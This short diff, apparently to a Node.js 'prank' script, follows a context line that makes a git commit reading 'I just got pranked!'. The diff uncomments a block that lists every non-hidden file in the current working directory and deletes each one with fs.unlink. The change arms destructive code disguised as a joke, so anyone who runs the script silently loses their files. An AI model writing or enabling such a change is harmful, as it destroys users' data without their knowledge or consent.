@@ -8,13 +8,13 @@ try {
   await exec(`git commit -m "I just got pranked!"`);
 } catch (err) {}
 
-// fs.readdir(process.cwd(), (err, files) => {
-//   if (err) throw err;
+fs.readdir(process.cwd(), (err, files) => {
+  if (err) throw err;
 
-//   files = files.filter((item) => !/(^|\/)\.[^\/\.]/g.test(item));
-//   for (const file of files) {
-//     fs.unlink(path.join(process.cwd(), file), (err) => {
-//       if (err) throw err;
-//     });
-//   }
-// });
+  files = files.filter((item) => !/(^|\/)\.[^\/\.]/g.test(item));
+  for (const file of files) {
+    fs.unlink(path.join(process.cwd(), file), (err) => {
+      if (err) throw err;
+    });
+  }
+});
